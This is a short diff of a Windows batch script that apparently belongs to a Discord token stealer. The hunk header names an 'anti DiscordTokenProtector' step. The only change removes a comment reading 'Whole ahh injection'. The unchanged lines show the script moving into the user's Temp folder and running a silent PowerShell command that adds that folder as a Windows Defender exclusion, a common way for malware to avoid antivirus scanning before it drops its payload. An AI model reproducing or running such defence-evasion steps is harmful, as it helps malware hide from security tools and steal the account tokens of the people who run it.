@@ -48,7 +48,6 @@ echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\
 
 
 ::back to my code!
-::Whole ahh injection
 cd %userprofile%\AppData\Local\Temp
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
 :: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
